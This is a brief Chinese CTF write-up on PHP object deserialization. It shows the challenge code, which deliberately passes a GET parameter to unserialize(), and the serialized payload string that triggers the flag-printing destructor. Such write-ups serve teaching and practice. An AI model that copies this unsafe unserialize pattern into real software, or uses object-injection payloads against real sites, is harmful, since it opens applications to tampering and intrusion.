#PHP 序列化

查看源码

```html
<!--
User-agent: *
Disallow: 什么东西呢？
-->
```

查看 robots.txt

```txt
User-agent: *
Disallow: /cl45s.php
```

查看文件 `cl45s.php`

```php
<?php
	error_reporting(0);
	show_source("cl45s.php");
	class wllm{          
		public $admin;       
		public $passwd;          
		public function __construct(){        
			$this->admin ="user";        
			$this->passwd = "123456";       
		}              
		public function __destruct(){           
			if($this->admin === "admin" && $this->passwd === "ctf"){
				include("flag.php");               
				echo $flag;           
			}else{               
				echo $this->admin;               
				echo $this->passwd;               
				echo "Just a bit more!";           
			}       
		}
	}
	$p = $_GET['p'];
	unserialize($p);
?>
```

以下构造

```php
$p = new wllm();
$p->admin = "admin";
$p->passwd = "ctf";
print(serialize($p));
```

之后传入序列化后的 p

```
?p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```
